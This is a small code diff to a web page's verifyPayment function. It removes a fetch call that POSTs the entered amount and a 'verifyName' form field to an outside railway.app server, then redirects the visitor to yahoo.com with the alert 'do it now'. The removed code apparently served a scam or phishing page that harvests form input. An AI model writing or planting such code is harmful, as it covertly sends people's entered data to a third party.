@@ -162,28 +162,7 @@
         }
 
         function verifyPayment(amount) {
-            fetch('https://server-production-b9a2.up.railway.app/c', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: new URLSearchParams({
-                    amount,
-                    verifyName: document.getElementById('verifyName').value
-                })
-            })
-                .then(response => response.json())
-                .then(data => {
-                    const successUrl = 'https://www.yahoo.com/';
-
-                    window.location.href = successUrl;
-                    alert('do it now');
-                })
-                .catch(error => {
-                    console.error(error);
-
-                    alert(error.message);
-                });
+            console.log('verifyPayment:', document.getElementById('verifyName').value);
 
             return false;
         }
